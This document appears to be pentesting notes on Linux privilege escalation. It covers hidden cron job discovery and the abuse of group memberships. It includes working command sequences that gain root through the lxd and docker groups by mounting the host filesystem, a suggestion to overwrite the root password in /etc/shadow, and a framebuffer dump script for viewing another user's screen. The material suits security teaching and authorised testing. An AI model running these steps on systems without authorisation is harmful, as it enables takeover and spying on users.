# Linux Privilege Escalation

### Cron Jobs

Viewing `/etc/crontab` is of course the classic.  The cron job format is in the following:

```
<minute> <hour> <day of month> <month> <day of week> <user> <command>
```

Ideally we'll have a vulnerable command being run that we can then exploit.

In some situation, cron jobs may be hidden from all users, in a users own crontab.  Running the below script will parse the active processes every second and output any changes, which may indicate a hidden cron job.

```bash
#!/bin/bash
IFS=$'\n'

old=$(ps -eo command)
while true; do
  new=$(ps -eo command)
  diff <( echo "$old" ) <( echo "$new" )
  sleep 1
  old=$new
done
```

If the above fails to find anything, then the process may be too short lived to find.  In this case, [Dominic Breuker's pspy](https://github.com/DominicBreuker/pspy) will allow more focused enumeration.

### Abusing Excessive Groups

Often you'll find that a user has been made a member of a group that it needn't be a part of.  From this you can abuse this to either leak information or compromise the system in unintended ways.

When first enumerating a group, see what it can access and what special permissions may be afforded it as so:

```
find / -group groupname 2>/dev/null
```

Secondly, it's probably a good idea to refer to the following

[Debian Recommendations](https://www.gitbook.com/book/reboare/booj-security/edit#)

##### adm

The admin group, adm, allows the user to view logs in `/var/log`.  Whilst this is not directly exploitable, it can be used to leak sensitive information, such as user actions, vulnerable applications and any potentially hidden cron-jobs.

##### lxd

If a member of the lxd gorup, the user can use this to escalate to root, and potentially escape any containers it is a member of.

```bash
ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
Creating test 
ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
Device whatever added to test 
ubuntu@ubuntu:~$ lxc start test 
ubuntu@ubuntu:~$ lxc exec test bash
```

By doing this we effectively have root permissions.  While you won't be able to run arbitrary code on the host, you can write and read any file with root privileges, allowing you to, for example, write a new root password in the /etc/shadow folder.

The [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder) is ideal for engagements, as it's no larger than 4MB.

##### docker

In much the same vein as lxd, we can utilise the docker group to get full root privileges.

```
docker run -v /:/mnt/rootfs -i -t chrisfosterelli/rootplease
```

Similarly, we can use the [alpine](https://github.com/gliderlabs/docker-alpine/tree/2127169e2d9dcbb7ae8c7eca599affd2d61b49a7) docker image, if no useable containers are uploaded to the host.

##### disk

The disk group gives the user full access to any block devices contained within `/dev/`.  Since `/dev/sda1` will in general be the global file-system, and the disk group will have full read-write privileges to this device:

```
brw-rw---- 1 root disk 8, 1 Feb  5 13:38 /dev/sda1
```

From this we can use debugfs to enumerate the entire disk with effectively root level privileges.  We also have full read-write access to the disk block files.  We can extricate these or write arbitrary data to them.

##### video

The video group controls access to graphical output devices.  The output to screen is stored within the [framebuffer](https://www.kernel.org/doc/Documentation/fb/framebuffer.txt), which can be dumped to disk and converted to an image, using the following [script](https://www.cnx-software.com/2010/07/18/how-to-do-a-framebuffer-screenshot/):

```perl
#!/usr/bin/perl -w

$w = shift || 240;
$h = shift || 320;
$pixels = $w * $h;

open OUT, "|pnmtopng" or die "Can't pipe pnmtopng: $!\n";

printf OUT "P6%d %d\n255\n", $w, $h;

while ((read STDIN, $raw, 2) and $pixels--) {
   $short = unpack('S', $raw);
   print OUT pack("C3",
      ($short & 0xf800) >> 8,
      ($short & 0x7e0) >> 3,
      ($short & 0x1f) << 3);
}

close OUT;
```

We can run the above script in the following manner:

```bash
cp /dev/fb0 /tmp/fb0.raw
width=$(cat /sys/class/graphics/fb0/virtual_size | cut -d, -f1)
height=$(cat /sys/class/graphics/fb0/virtual_size | cut -d, -f2)
./raw2png $width $height < /tmp/fb0.raw > /tmp/fb0.png
```

This isn't directly exploitable, but utilized correctly can allow you to view a user with physical access' session and potentially leak information this way.  On modern systems it's a slight pipe dream.

[Alternative Script](ftp://ftp.embeddedarm.com/ts-arm-sbc/ts-7350-linux/samples/bmptoraw.c)

